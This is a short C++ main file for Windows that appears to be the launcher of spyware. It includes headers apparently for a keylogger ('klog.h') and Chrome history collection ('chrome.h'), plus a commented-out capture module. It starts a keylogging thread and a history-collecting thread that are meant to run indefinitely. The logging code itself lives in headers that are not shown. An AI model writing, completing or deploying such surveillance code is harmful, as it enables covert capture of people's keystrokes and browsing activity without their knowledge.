#include <Windows.h>
#include <chrono>
#include <ctime>
#include <thread>

#include "write.h"
#include "chrome.h"
#include "klog.h"
// #include "capt.h"

int main(){
    // Awaken the Daemons
    std::thread klogd(init_klogd);
    std::thread historyd(init_historyd);
    
    //This is just a theoretical end to keep the main thread running. Klogd will never join
    historyd.join();
    klogd.join();

    return 0;
}